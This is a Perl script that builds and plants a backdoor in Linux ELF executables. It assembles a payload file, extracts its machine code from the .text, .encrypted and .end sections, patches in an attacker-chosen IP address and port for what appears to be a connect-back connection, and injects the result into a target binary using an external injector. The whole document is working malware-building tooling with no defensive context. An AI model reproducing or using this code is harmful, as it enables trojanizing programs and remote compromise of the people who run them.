#!/usr/bin/perl

use strict;
use warnings;
my $DOOOR_FILE = 'ex1';

die "[-] Usage : $0 <elf> <ip> <port>\n" if(@ARGV != 3);

my ($bin, $ip, $port) = @ARGV;
my $code;

print "[+] Compiling $DOOOR_FILE...\n";
compile_code();

print "[+] Extracting code...\n";
$code = extract_code();

print "[+] Code length : " . (length($code)/4) . "\n";

print "[+] Patching port ($port)...\n";
patch_port();

print "[+] Patching IP ($ip)...\n";
patch_ip();

print "[+] Inject code in $bin...\n";
inject_code();

sub inject_code {
    my @out;

    @out  = `../inject-2 $bin "$code"`;
    print $_ foreach(@out);
    die "[-] inject failed\n" if($?);
}

sub patch_ip {

    my $addr = sprintf "\\x%.2x\\x%.2x\\x%.2x\\x%.2x", split(/\./, $ip);
    
    $code =~ s/\\x76\\x76\\x76\\x76/$addr/;
}

sub patch_port {
    my ($p1, $p2);

    ($p1,$p2) = unpack('CC', pack('n', $port));
    $p1 = sprintf "\\x%.2x", $p1;
    $p2 = sprintf "\\x%.2x", $p2;

    $code =~ s/\\x96\\x96/$p1$p2/;
}

sub compile_code {
    `nasm -f elf $DOOOR_FILE.asm`;
    die "[-] Nasm failed !\n" if($?);
    `ld $DOOOR_FILE.o -o $DOOOR_FILE`;
    die "[-] Id failed !\n" if($?);	
}

sub extract_code {
    my @line;
    my $code;

    @line = `objdump -d -j .text $DOOOR_FILE`;
    die "[-] Objdump failed !\n" if($?);

    foreach(@line) {
	if(m/^\s+\S+\s+(([0-9a-f]{2}\s)+)/) {
	    foreach(split(/\s/, $1)) {
		$code .= '\\x' . $_;
	    }
	}
    }

    @line = `objdump -d -j .encrypted $DOOOR_FILE`;
    die "[-] Objdump failed !\n" if($?);

    foreach(@line) {
	if(m/^\s+\S+\s+(([0-9a-f]{2}\s)+)/) {
	    foreach(split(/\s/, $1)) {
		$code .= '\\x' . $_;
	    }
	}
    }

    @line = `objdump -d -j .end $DOOOR_FILE`;
    die "[-] Objdump failed !\n" if($?);

    foreach(@line) {
	if(m/^\s+\S+\s+(([0-9a-f]{2}\s)+)/) {
	    foreach(split(/\s/, $1)) {
		$code .= '\\x' . $_;
	    }
	}
    }

    return $code;
}
